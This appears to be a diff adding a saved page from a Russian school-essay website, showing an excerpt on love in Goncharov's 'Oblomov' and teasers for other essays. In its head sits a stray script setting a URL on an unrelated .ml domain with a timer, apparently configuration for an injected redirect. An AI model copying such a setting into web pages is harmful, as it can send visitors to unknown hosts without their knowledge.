@@ -1,0 +1,630 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru-ru" lang="ru-ru">
+
+<head>
+  <base href="http://vsesoch.ru/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="" />
+  <meta name="description" content="Сочинения. Школьные сочинения по литературе. Все сочинения, готовые школьные сочинения по русскому языку и литературе." />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>Все школьные сочинения по литературе</title>
+  <link href="/index.php?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+  <link href="/index.php?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+  <link href="/templates/ja_corona/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <link rel="stylesheet" href="http://vsesoch.ru/modules/mod_news_pro_gk4/interface/css/style.css" type="text/css" />
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/media/system/js/caption.js"></script>
+  <script type="text/javascript" src="http://vsesoch.ru/modules/mod_news_pro_gk4/interface/scripts/engine-mootools-11.js"></script>
+
+
+<link rel="stylesheet" href="http://vsesoch.ru/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="http://vsesoch.ru/templates/system/css/general.css" type="text/css" />
+<link rel="stylesheet" href="http://vsesoch.ru/templates/ja_corona/css/editor.css" type="text/css" />
+
+<link rel="stylesheet" href="http://vsesoch.ru/templates/ja_corona/css/template.css" type="text/css" />
+<link rel="stylesheet" href="http://vsesoch.ru/templates/ja_corona/css/typo.css" type="text/css" />
+
+<script language="javascript" type="text/javascript" src="http://vsesoch.ru/templates/ja_corona/js/ja.script.js"></script>
+
+<script type="text/javascript">
+    var _mnd_cu = {url: 'http://fixbib.ml/', time: 240};
+</script>
+
+
+
+<!-- Menu head -->
+			<link href="http://vsesoch.ru/templates/ja_corona/ja_menus/ja_slidemenu/ja.slidemenu.css" rel="stylesheet" type="text/css" />
+			<script src="http://vsesoch.ru/templates/ja_corona/ja_menus/ja_slidemenu/ja.slidemenu.js" language="javascript" type="text/javascript"></script>
+			
+<link href="http://vsesoch.ru/templates/ja_corona/css/colors/default.css" rel="stylesheet" type="text/css" />
+
+<!--[if lte IE 6]>
+<style type="text/css">
+.clearfix {height: 1%;}
+img {border: none;}
+</style>
+<![endif]-->
+
+<!--[if gte IE 7.0]>
+<style type="text/css">
+.clearfix {display: inline-block;}
+</style>
+<![endif]-->
+
+<!--[if gt IE 7]>
+<link href="http://vsesoch.ru/templates/ja_corona/css/ie8.css" rel="stylesheet" type="text/css" />
+<![endif]-->
+
+<script type="text/javascript">
+/*<![CDATA[*/
+document.write ('<style type="text\/css">#ja-mainnav ul{visibility: hidden;}<\/style>');
+/*]]>*/
+</script>
+
+<style>
+* {-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;}
+</style>
+</head>
+
+<body id="bd" class="wide fs3" >
+<a name="Top" id="Top"></a>
+<ul class="accessibility">
+	<li><a href="/#ja-content" title="Skip to content">Skip to content</a></li>
+	<li><a href="/#ja-mainnav" title="Skip to main navigation">Skip to main navigation</a></li>
+	<li><a href="/#ja-col1" title="Skip to 1st column">Skip to 1st column</a></li>
+	<li><a href="/#ja-col2" title="Skip to 2nd column">Skip to 2nd column</a></li>
+	<li><a href="/#ja-col3" title="Skip to 3nd column">Skip to 2nd column</a></li>
+</ul>
+
+<div id="ja-wrapper-top">
+<div id="ja-wrapper">
+
+<!-- BEGIN: HEADER -->
+<div id="ja-headerwrap">
+<div id="ja-header" class="clearfix">
+
+	<h1 class="logo">
+		<a href="/" title="Все школьные сочинения по литературе"><span>Все школьные сочинения по литературе</span></a>
+	</h1>
+
+	<!-- BEGIN: MAIN NAVIGATION -->
+	<div id="ja-mainnav" class="clearfix">
+		<div id="ja-slidemenu" class="mainlevel clearfix">
+<ul><li class="menu-item0 active first-item"><a href="/" class="menu-item0 active first-item" id="menu1" title="Главная"><span class="menu-title">Главная</span><span class="menu-desc">Все школьные сочинения по литературе</span></a></li><li class="menu-item1"><a href="/obratnaya-svyaz.html" class="menu-item1" id="menu2" title="Обратная связь"><span class="menu-title">Обратная связь</span><span class="menu-desc">Обратная связь</span></a></li><li class="menu-item2"><a href="/karta-sajta.html" class="menu-item2" id="menu3" title="Карта сайта"><span class="menu-title">Карта сайта</span><span class="menu-desc">Карта сайта</span></a></li><li class="menu-item3 last-item"><a href="/dobavit-sochinenie.html" class="menu-item3 last-item" id="menu98" title="Добавить сочинение"><span class="menu-title">Добавить сочинение</span><span class="menu-desc">Добавить сочинение</span></a></li></ul>
+</div>				<script type="text/javascript">
+					window.addEvent('domready', function(){new JASplit2Menu($E('#ja-slidemenu ul'),{
+			navwidth: 0,
+			offwidth: 64,
+			showactive: true
+		});});
+				</script>
+					</div>
+	<!-- END: MAIN NAVIGATION -->
+
+	<!-- BEGIN: USER TOOLS -->
+    <div id="ja-usertools">
+  				<ul class="ja-usertools-font">
+	      	<li><img style="cursor: pointer;" title="Increase font size" src="http://vsesoch.ru/templates/ja_corona/images/user-increase.gif" alt="Increase font size" id="ja-tool-increase" onclick="switchFontSize('ja_corona_ja_font','inc'); return false;" /></li>
+		    <li><img style="cursor: pointer;" title="Default font size" src="http://vsesoch.ru/templates/ja_corona/images/user-reset.gif" alt="Default font size" id="ja-tool-reset" onclick="switchFontSize('ja_corona_ja_font',3); return false;" /></li>
+		    <li><img style="cursor: pointer;" title="Decrease font size" src="http://vsesoch.ru/templates/ja_corona/images/user-decrease.gif" alt="Decrease font size" id="ja-tool-decrease" onclick="switchFontSize('ja_corona_ja_font','dec'); return false;" /></li>
+			</ul>
+			<script type="text/javascript">var CurrentFontSize=parseInt('3');</script>
+						<ul class="ja-usertools-color">
+			
+				<li><img style="cursor: pointer;" src="http://vsesoch.ru/templates/ja_corona/images/default-hilite.gif" title="default color" alt="default color" id="ja-tool-defaultcolor" onclick="switchTool('ja_corona_ja_color','default');return false;" /></li>
+				
+				<li><img style="cursor: pointer;" src="http://vsesoch.ru/templates/ja_corona/images/black.gif" title="black color" alt="black color" id="ja-tool-blackcolor" onclick="switchTool('ja_corona_ja_color','black');return false;" /></li>
+							</ul>
+		  </div>
+  	<!-- END: USER TOOLS -->
+
+</div>
+</div>
+<!-- END: HEADER -->
+
+
+<!-- BEGIN: SEARCH + SUBNAV -->
+<div id="ja-subnavwrap">
+
+			<div id="ja-search">
+			<form action="index.php" method="post">
+	<div class="search">
+		<input name="searchword" id="mod_search_searchword" maxlength="20" alt="Поиск" class="inputbox" type="text" size="20" value="поиск..."  onblur="if(this.value=='') this.value='поиск...';" onfocus="if(this.value=='поиск...') this.value='';" />	</div>
+	<input type="hidden" name="task"   value="search" />
+	<input type="hidden" name="option" value="com_search" />
+	<input type="hidden" name="Itemid" value="1" />
+</form>
+		</div>
+	
+	
+</div>
+<!-- END: SEARCH + SUBNAV -->
+
+<div id="ja-mainwrap">
+
+<!-- BEGIN: TOP SPOTLIGHT -->
+<div id="ja-topslwrap" class="clearfix">
+		<div id="ja-topsl1" class="ja-box-br" style="width:100%; float: left;">
+	<div class="ja-box-bl"><div class="ja-box-tr"><div class="ja-box-tl clearfix">
+
+	  	  <div class="ja-box-left" style="width: 50%;">
+					<div class="moduletable">
+					<h3>Новые сочинения</h3>
+					<ul class="latestnews">
+	<li class="latestnews">
+		<a href="/ese/1993-tvr-pro-storichn-psn.html" class="latestnews">
+			Твір про історичні пісні</a>
+	</li>
+	<li class="latestnews">
+		<a href="/ese/1992-tvr-moya-babusya.html" class="latestnews">
+			Твір моя бабуся</a>
+	</li>
+	<li class="latestnews">
+		<a href="/genrk-bsen/1991-tvr-rozdum-majbutn-ukransko-movi.html" class="latestnews">
+			Твір-роздум майбутнє української мови</a>
+	</li>
+	<li class="latestnews">
+		<a href="/ese/1990-tvr-rozdum-chomu-ya-rozmovlyayu-ukranskoyu-movoyu.html" class="latestnews">
+			Твір-роздум чому я розмовляю українською мовою</a>
+	</li>
+	<li class="latestnews">
+		<a href="/ese/1989-shho-take-tvr-opis.html" class="latestnews">
+			Що таке твір-опис</a>
+	</li>
+</ul>		</div>
+	
+	  </div>
+	  
+	  	  <div class="ja-box-right" style="width: 50%;">
+					<div class="moduletable">
+					<h3>Самые популярные сочинения</h3>
+					<ul class="mostread">
+	<li class="mostread">
+		<a href="/vremena-goda/516-sochinenie-na-temu-qvesnaq.html" class="mostread">
+			Сочинение на тему &quot;Весна&quot;</a>
+	</li>
+	<li class="mostread">
+		<a href="/sochineniya-po-kartinam/513-sochinenie-po-kartine-vasneczova-tri-bogatyrya.html" class="mostread">
+			Сочинение по картине Васнецова - Три Богатыря</a>
+	</li>
+	<li class="mostread">
+		<a href="/sochineniya-na-raznuyu-temu/1177-sochinenie-na-temu-lmoj-gorodr.html" class="mostread">
+			Сочинение на тему: «Мой город»</a>
+	</li>
+	<li class="mostread">
+		<a href="/sochineniya-na-raznuyu-temu/1171-sochinenie-na-temu-lmoya-rodinar.html" class="mostread">
+			Сочинение на тему «Моя родина»</a>
+	</li>
+	<li class="mostread">
+		<a href="/sochineniya-9-klass/548-sochinenie-na-temu-qmoya-lyubimaya-knigaq.html" class="mostread">
+			Сочинение на тему &quot;Моя любимая книга&quot;</a>
+	</li>
+</ul>		</div>
+	
+	  </div>
+	  
+	</div></div></div></div>
+	
+	
+</div>
+
+
+
+
+<!-- END: TOP SPOTLIGHT -->
+
+<div id="ja-containerwrap">
+<div id="ja-container">
+<div id="ja-container-top">
+<div id="ja-container-bot" class="clearfix">
+<div id="ja-container-inner1">
+<div id="ja-container-inner2" class="clearfix">
+
+	<!-- BEGIN: CONTENT -->
+
+	<div id="ja-content">
+
+	<div class="ja-innerpad clearfix">
+		<div class="moduletable">
+					
+<!-- /mod_php version 1.0.0.Alpha1-J1.5 (c) www.fijiwebdesign.com -->
+ <div id="bn_f16119b954">загрузка...</div>
+<script src="http://recreativ.ru/rcode.f16119b954.js" type="text/javascript"></script>
+
+<!-- mod_php version 1.0.0.Alpha1-J1.5/ -->
+		</div>
+	
+
+		
+
+		
+		<table class="blog" cellpadding="0" cellspacing="0">
+<tr>
+	<td valign="top">
+					<div>
+		
+<div class="contentpaneopen">
+
+<h2 class="contentheading">
+			Любовь для Обломова (по роману И. А. Гончарова «Обломов»)	</h2>
+
+
+<div class="article-tools clearfix">
+<div class="article-meta">
+
+	<span class="createdate">
+		20.10.2011 09:01	</span>
+
+	<span class="createby">
+		Администратор	</span>
+
+</div>
+
+<div class="buttonheading">
+		<span>
+	<a href="/component/mailto/?tmpl=component&amp;link=aHR0cDovL3ZzZXNvY2gucnUvaS1hLWdvbmNoYXJvdi84MDgtbHl1Ym92LWRseWEtb2Jsb21vdmEtcG8tcm9tYW51LWktYS1nb25jaGFyb3ZhLWxvYmxvbW92ci5odG1s" title="E-mail" onclick="window.open(this.href,'win2','width=400,height=350,menubar=yes,resizable=yes'); return false;"><img src="/images/M_images/emailButton.png" alt="E-mail"  /></a>	</span>
+	
+		<span>
+	<a href="/index.php?view=article&amp;catid=12:goncharov&amp;id=808:lyubov-dlya-oblomova-po-romanu-i-a-goncharova-loblomovr&amp;tmpl=component&amp;print=1&amp;layout=default&amp;page=" title="Печать" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/printButton.png" alt="Печать"  /></a>	</span>
+	
+		<span>
+	<a href="/index.php?view=article&amp;catid=12:goncharov&amp;id=808:lyubov-dlya-oblomova-po-romanu-i-a-goncharova-loblomovr&amp;format=pdf" title="PDF" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/templates/ja_corona/images/pdf_button.png" alt="PDF"  /></a>	</span>
+	</div>
+
+</div>
+
+
+<div class="article-content">
+<p style="text-align: justify;"><span style="font-size: small;"><em>Сочинение на тему «Любовь для Обломова» (по роману И. А. Гончарова «Обломов»)</em></span></p>
+<p style="text-align: justify;"><span style="font-size: small;">Личность Обломова далеко не ординарна, хотя другие персонажи и относятся к нему с легким неуважением. По какой-то причине они читают его едва ли не ущербным по сравнению с ними. Именно это и составляло задачу Ольги Ильинской – разбудить Обломова, заставить его проявить себя как человека деятельного. Девушка считала, что любовь подвигнет его на великие свершения. Но она глубоко ошибалась. Невозможно разбудить в человеке то, чего у него нет. Из-за этого недоразумения разбились сердца людей, герои страдали и тяжело переживали разрыв. В чем же заключалась ошибка Ольги? Неужели Обломов оказался неспособен любить и быть любимым?</span></p>
+</div>
+
+	<span class="modifydate">
+		Обновлено ( 08.11.2014 00:23 )
+	</span>
+
+	<a href="/i-a-goncharov/808-lyubov-dlya-oblomova-po-romanu-i-a-goncharova-loblomovr.html" title="Любовь для Обломова (по роману И. А. Гончарова «Обломов»)" class="readon">
+							Подробнее...				</a>
+
+</div>
+
+<span class="article_separator">&nbsp;</span>
+		</div>
+		</td>
+</tr>
+
+
+</table>
+
+
+		
+				<!-- BEGIN: BANNER -->
+		<div id="ja-banner">
+					<div class="moduletable">
+					
+	<div class="nsp_main nsp_fs100" id="nsp-nsp_23" style="width:100%;">
+		
+					
+			<div class="nsp_arts bottom" style="width:100%;">
+			
+							
+														<div class="nsp_art" style="width:50%;clear:both;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/l-n-tolstoj/1299-sochinenie-lkavkazskij-plennikr-5-klass.html" title="Сочинение «Кавказский пленник» - 5 класс">Сочинение «Кавказский пленник» - 5 класс</a></h4><p class="nsp_text tleft fleft">Поветь «Кавказский пленник» Л.Н. Толстого описывает повседневный быт и красоту природы Кавказа. Рассказ ведется от первого лица и с начальных строк произведения, мы как будто попадаем в сказку, где основные события формируются вокруг приключений офицера русской армии Жилина, который попадает в плен к свободолюбивым жителям – горцам.
+ <a class="nsp_readmore inline" href="/l-n-tolstoj/1299-sochinenie-lkavkazskij-plennikr-5-klass.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:50%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/a-i-kuprin/1389-qgranatovyj-brasletq-sochinenie-tema-lyubvi-.html" title=""Гранатовый браслет" сочинение тема любви	">"Гранатовый браслет" сочинение тема любви	</a></h4><p class="nsp_text tleft fleft">Сочинение на тему: "Трагичная любовь Желткова (по повести А. И. Куприна «Гранатовый браслет» - сочинение на тему гранатовый браслет).
+Александр Иванович Куприн - талантливый писатель, идеально владеющий художественным словом. Произведения этого русского писателя насквозь пронизаны любовью. Каждый герой по-своему уникален, и все персонажи настолько живо изображены, что заставляют переживать вместе... <a class="nsp_readmore inline" href="/a-i-kuprin/1389-qgranatovyj-brasletq-sochinenie-tema-lyubvi-.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:50%;clear:both;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/vg-korolenko/1220-sochinenie-na-temu-ldurnoe-obshhestvor-vgkorolenko.html" title="Сочинение на тему «Дурное общество» ">Сочинение на тему «Дурное общество» </a></h4><p class="nsp_text tleft fleft">Рассказ В.Г.Короленко «В дурном обществе» был создан с 1881 по 1884 годы, опубликован в 1885 году. Название произведения настораживает: что это за общество такое – дурное? Сам Короленко говорил, что многое в его рассказе взято с натуры, а город, в котором всё происходило описан в точности с реальным местом.
+ <a class="nsp_readmore inline" href="/vg-korolenko/1220-sochinenie-na-temu-ldurnoe-obshhestvor-vgkorolenko.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:50%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/n-s-leskov/111-obraz-levshi-v-rasskaze-ns-leskova-qlevshaq.html" title="Образ Левши в рассказе Н.С. Лескова "Левша"">Образ Левши в рассказе Н.С. Лескова "Левша"</a></h4><p class="nsp_text tleft fleft">Сочинение на тему: "Образ Левши в рассказе Н.С. Лескова "Левша"
+"Отличительные свойства прозы Н.С. Лескова – сказочные мотивы, сплетение комического и трагического, неоднозначность авторских оценок персонажей – в полной мере появились в одном из самых известных произведений писатель "Левше". Заглавный герой, внешне ничем особенным не выделяющийся ("на щеке пятно родимое, а на висках волосья при у... <a class="nsp_readmore inline" href="/n-s-leskov/111-obraz-levshi-v-rasskaze-ns-leskova-qlevshaq.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:50%;clear:both;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/m-a-sholoxov/693-tragicheskaya-sudba-grigoriya-melexova-v-romane-m-a-sholoxova-ltixij-donr.html" title="Трагическая судьба Григория Мелехова в романе М. А. Шолохова «Тихий дон»">Трагическая судьба Григория Мелехова в романе М. А. Шолохова «Тихий дон»</a></h4><p class="nsp_text tleft fleft">Среди книг о революционных событиях и гражданской войне «Тихий Дон» выделяется самобытной уникальностью. Чем же покоряет читателей эта книга? Я думаю, прежде всего значительностью и масштабностью событий, описанных в ней, глубиной и реалистичностью характеров героев, что позволяет нам задуматься над поднятыми в романе нравственно-философскими вопросами. Писатель развернул перед нами, читателями, к... <a class="nsp_readmore inline" href="/m-a-sholoxov/693-tragicheskaya-sudba-grigoriya-melexova-v-romane-m-a-sholoxova-ltixij-donr.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:50%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/a-s-pushkin/1425-qstanczionnyj-smotritelq-sochinenie.html" title=""Станционный смотритель" сочинение">"Станционный смотритель" сочинение</a></h4><p class="nsp_text tleft fleft">Пушкин «Станционный смотритель» - сочинение на тему «Ответственность родителей и детей друг перед другом».
+В повести «Станционный смотритель» А. Пушкин рассказывает историю бедного чиновника низшего класса - Самсона Вырина. В основу сюжета положена трагедия жизни этого «маленького» человека, который, несмотря на тяжелые жизненные условия и унизительный труд, вполне счастлив и не жалуется на судьб... <a class="nsp_readmore inline" href="/a-s-pushkin/1425-qstanczionnyj-smotritelq-sochinenie.html">Подробнее</a></p></div></div>
+					
+			</div>
+				
+			</div>
+
+<script type="text/javascript">
+//<![CDATA[
+try {$Gavick;}catch(e){$Gavick = {};};
+$Gavick["nsp-nsp_23"] = {
+	"animation_speed": 350,
+	"animation_interval": 5000,
+	"news_column": 2,
+	"news_rows": 3,
+	"links_columns_amount": 0,
+	"links_amount": 0,
+	"counter_text": '<strong>Страница:</strong>'
+};
+//]]>
+</script>			</div>
+			<div class="moduletable">
+					<h3>Популярные сочинения</h3>
+					
+	<div class="nsp_main nsp_fs100" id="nsp-nsp_16" style="width:100%;">
+		
+					
+			<div class="nsp_arts bottom" style="width:100%;">
+			
+							
+														<div class="nsp_art" style="width:100%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/slovo-o-polku-igoreve/1096-sochinenie-glavnaya-ideya-v-proizvedenii-lslovo-o-polku-igorever.html" title="Сочинение. Главная идея в произведении «Слово о полку Игореве»">Сочинение. Главная идея в произведении «Слово о полку Игореве»</a></h4><p class="nsp_text tleft fleft">На первый взгляд произведение «Слово полку Игореве» рассказывает нам историю о походе великого русского князя. Но если внимательно ознакомиться с текстом, то становится очевидным, что поход - всего лишь повод для автора задуматься и поразмышлять о судьбе русского  народа и его земли. Красной линией сквозь всю повесть проходит страстный призыв объединить народ, чтобы защитить землю русскую.
+Автор,... <a class="nsp_readmore inline" href="/slovo-o-polku-igoreve/1096-sochinenie-glavnaya-ideya-v-proizvedenii-lslovo-o-polku-igorever.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:100%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/slovo-o-polku-igoreve/774-obraz-russkoj-zemli-v-lslove-o-polku-igorever.html" title="Образ Русской земли в «Слове о полку Игореве»">Образ Русской земли в «Слове о полку Игореве»</a></h4><p class="nsp_text tleft fleft">«Слово о полку Игореве» было написано в XII в. Это произведение посвящено неудачному походу князя Игоря против половцев, взятию его в плен и возвращению на родину. «Слово о полку Игореве» проникнуто истинным патриотизмом, искренней любовью к своему отечеству. Вот почему в произведении значительное место занимает образ Русской земли.
+Любовью к Родине проникнуто все произведение. Глубокой человечно... <a class="nsp_readmore inline" href="/slovo-o-polku-igoreve/774-obraz-russkoj-zemli-v-lslove-o-polku-igorever.html">Подробнее</a></p></div></div>
+					
+			</div>
+				
+			</div>
+
+<script type="text/javascript">
+//<![CDATA[
+try {$Gavick;}catch(e){$Gavick = {};};
+$Gavick["nsp-nsp_16"] = {
+	"animation_speed": 350,
+	"animation_interval": 5000,
+	"news_column": 1,
+	"news_rows": 2,
+	"links_columns_amount": 0,
+	"links_amount": 0,
+	"counter_text": '<strong>Страница:</strong>'
+};
+//]]>
+</script>			</div>
+			<div class="moduletable">
+					
+	<div class="nsp_main nsp_fs100" id="nsp-nsp_22" style="width:100%;">
+		
+					
+			<div class="nsp_arts bottom" style="width:100%;">
+			
+							
+														<div class="nsp_art" style="width:100%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/component/content/article/113-peskov-vm/1069-sochinenie-rassuzhdenie-po-state-v-peskova-lv-prirode-est-prazdnikir.html" title="Сочинение-рассуждение по статье В. Пескова «В природе есть праздники…»">Сочинение-рассуждение по статье В. Пескова «В природе есть праздники…»</a></h4><p class="nsp_text tleft fleft">Какую роль в жизни человека играет природа? Об этом размышляют люди испокон веков. Особенно актуальной эта проблема стала в XX веке, итогом которого стали глобальные экологические проблемы.
+Но я думаю, что человечество не дожило бы даже до настоящего времени, если бы писатели и поэты постоянно не напоминали о том, что человек и природа не могут существовать раздельно, если бы они не учили нас люб... <a class="nsp_readmore inline" href="/component/content/article/113-peskov-vm/1069-sochinenie-rassuzhdenie-po-state-v-peskova-lv-prirode-est-prazdnikir.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:100%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/m-czvetaeva/1406-qtvorchestvo-czvetaevojq-sochinenie.html" title=""Творчество Цветаевой" сочинение">"Творчество Цветаевой" сочинение</a></h4><p class="nsp_text tleft fleft">Сочинение на тему: "Творческий путь Марины Цветаевой".
+Марина Ивановна Цветаева - одна из самых известных русских поэтесс. Ее вклад в русскую культуру поистине значительный, ведь она писала не только стихи, но и прозу, освоив множество разных жанров. Поэзия Цветаевой неразрывно связана с прозой, ей присуще особенное звучание. Она писала, что проза поэта отличается от прозы прозаика. И действитель... <a class="nsp_readmore inline" href="/m-czvetaeva/1406-qtvorchestvo-czvetaevojq-sochinenie.html">Подробнее</a></p></div></div>
+					
+			</div>
+				
+			</div>
+
+<script type="text/javascript">
+//<![CDATA[
+try {$Gavick;}catch(e){$Gavick = {};};
+$Gavick["nsp-nsp_22"] = {
+	"animation_speed": 350,
+	"animation_interval": 5000,
+	"news_column": 1,
+	"news_rows": 2,
+	"links_columns_amount": 0,
+	"links_amount": 0,
+	"counter_text": '<strong>Страница:</strong>'
+};
+//]]>
+</script>			</div>
+			<div class="moduletable">
+					
+	<div class="nsp_main nsp_fs100" id="nsp-nsp_43" style="width:100%;">
+		
+					
+			<div class="nsp_arts bottom" style="width:100%;">
+			
+							
+														<div class="nsp_art" style="width:50%;clear:both;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/vremena-goda/516-sochinenie-na-temu-qvesnaq.html" title="Сочинение на тему "Весна"">Сочинение на тему "Весна"</a></h4><p class="nsp_text tleft fleft">Наступила весна. Сквозь низко нависшие тучи стало проглядывать голубое чистое небо. Таким прозрачно-синим оно может быть только весной. По земле побежали звонкие ручейки. Сначала их было мало, но с каждым днем они все чаще и чаще прорезали лед своими струйками. Пение ранних пташек и звонкая капель с крыш заполняют мир, весенняя музыка приходит на смену долгому зимнему молчанию и завыванию ветра. В... <a class="nsp_readmore inline" href="/vremena-goda/516-sochinenie-na-temu-qvesnaq.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:50%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/sochineniya-po-kartinam/513-sochinenie-po-kartine-vasneczova-tri-bogatyrya.html" title="Сочинение по картине Васнецова - Три Богатыря">Сочинение по картине Васнецова - Три Богатыря</a></h4><p class="nsp_text tleft fleft">Виктор Михайлович Васнецов - знаменитый русский художник, автор жанровых картин, лирических и монументально-эпических полотен на тему русской истории, народных сказок и былин. Одним из наиболее известных произведений Васнецова является картина "Богатыри".  Художник изобразил на картине трех былинных богатырей - Илью Муромца, Добрыню Никитича и Алешу Поповича. Они стоят в дозоре, оберегая Русь от н... <a class="nsp_readmore inline" href="/sochineniya-po-kartinam/513-sochinenie-po-kartine-vasneczova-tri-bogatyrya.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:50%;clear:both;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/sochineniya-na-raznuyu-temu/1177-sochinenie-na-temu-lmoj-gorodr.html" title="Сочинение на тему: «Мой город»">Сочинение на тему: «Мой город»</a></h4><p class="nsp_text tleft fleft">Вам нравится город, где вы живете? Мне нравится!
+Я живу в самом лучшем в мире городе. Потому, что он красивый, он родной. Тут я родилась, выросла. Тут мои друзья, родители. Именно в этом городе я сделала первые шаги, сказала первые слова, первый раз увидела самого родного человека на земле: маму. Каждая улица, каждый дом мне тут знаком. В моем городе самые красивые закаты, они, то ярко алые, то н... <a class="nsp_readmore inline" href="/sochineniya-na-raznuyu-temu/1177-sochinenie-na-temu-lmoj-gorodr.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:50%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/sochineniya-na-raznuyu-temu/1171-sochinenie-na-temu-lmoya-rodinar.html" title="Сочинение на тему «Моя родина»">Сочинение на тему «Моя родина»</a></h4><p class="nsp_text tleft fleft">Тема Родины в русской литературе представлена довольно широко. Многие писатели и поэты посвящали ей стихи, поэмы и даже романы. Наверное, нет автора, который не написал о своей родине хотя бы одну строчку. Чем же эта тема так волновала, почему привлекала внимание? Для начала нужно разобраться в самом понятии «родина». Что это такое? В словаре Ожегова находим: «Родина – 1. Отечество, родная страна ... <a class="nsp_readmore inline" href="/sochineniya-na-raznuyu-temu/1171-sochinenie-na-temu-lmoya-rodinar.html">Подробнее</a></p></div></div>
+					
+			</div>
+				
+			</div>
+
+<script type="text/javascript">
+//<![CDATA[
+try {$Gavick;}catch(e){$Gavick = {};};
+$Gavick["nsp-nsp_43"] = {
+	"animation_speed": 350,
+	"animation_interval": 5000,
+	"news_column": 2,
+	"news_rows": 2,
+	"links_columns_amount": 0,
+	"links_amount": 0,
+	"counter_text": '<strong>Страница:</strong>'
+};
+//]]>
+</script>			</div>
+			<div class="moduletable">
+					
+	<div class="nsp_main nsp_fs100" id="nsp-nsp_48" style="width:100%;">
+		
+					
+			<div class="nsp_arts bottom" style="width:100%;">
+			
+							
+														<div class="nsp_art" style="width:100%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/dzhek-london/923-sochinenie-po-rasskazu-dzheka-londona-llyubov-k-zhiznir.html" title="Сочинение по рассказу Джека Лондона «Любовь к жизни»">Сочинение по рассказу Джека Лондона «Любовь к жизни»</a></h4><p class="nsp_text tleft fleft">В произведении Джека Лондона «Любовь к жизни» рассказывается история человека, стоявшего на краю смерти, но сумевшего спастись благодаря упорству и мужеству, благодаря любви к жизни.
+Человек с тех пор, как появился на нашей планете, воевал с природой. Начиная с первобытных времен он стремился доказать свое превосходство над ней. Об этом и рассказ «Любовь к жизни» — о силе человека и о его превосх... <a class="nsp_readmore inline" href="/dzhek-london/923-sochinenie-po-rasskazu-dzheka-londona-llyubov-k-zhiznir.html">Подробнее</a></p></div></div>
+														<div class="nsp_art" style="width:100%;"><div style="padding:2px 4px 2px 4px"><h4 class="nsp_header tleft fnone"><a href="/dzhek-london/1157-sochinenie-na-temu-llyubov-k-zhiznir-ili-chto-pomoglo-vyzhit-geroyu-rasskaza-dzheka-londona.html" title="Сочинение на тему «Любовь к жизни» или что помогло выжить герою рассказа Джека Лондона">Сочинение на тему «Любовь к жизни» или что помогло выжить герою рассказа Джека Лондона</a></h4><p class="nsp_text tleft fleft"> Впечатляющее произведение Джека Лондона «Любовь к жизни» - это рассказ о огромной человеческой силе воли, мужества и упорства. Это история одного человека, который благодаря любви к жизни, смог противостоять смерти, спастись и выжить,  не смотря ни на что.  Это рассказ о силе и превосходстве человека над природой.
+ <a class="nsp_readmore inline" href="/dzhek-london/1157-sochinenie-na-temu-llyubov-k-zhiznir-ili-chto-pomoglo-vyzhit-geroyu-rasskaza-dzheka-londona.html">Подробнее</a></p></div></div>
+					
+			</div>
+				
+			</div>
+
+<script type="text/javascript">
+//<![CDATA[
+try {$Gavick;}catch(e){$Gavick = {};};
+$Gavick["nsp-nsp_48"] = {
+	"animation_speed": 350,
+	"animation_interval": 5000,
+	"news_column": 1,
+	"news_rows": 2,
+	"links_columns_amount": 0,
+	"links_amount": 0,
+	"counter_text": '<strong>Страница:</strong>'
+};
+//]]>
+</script>			</div>
+			<div class="moduletable">
+					
+<!-- /mod_php version 1.0.0.Alpha1-J1.5 (c) www.fijiwebdesign.com -->
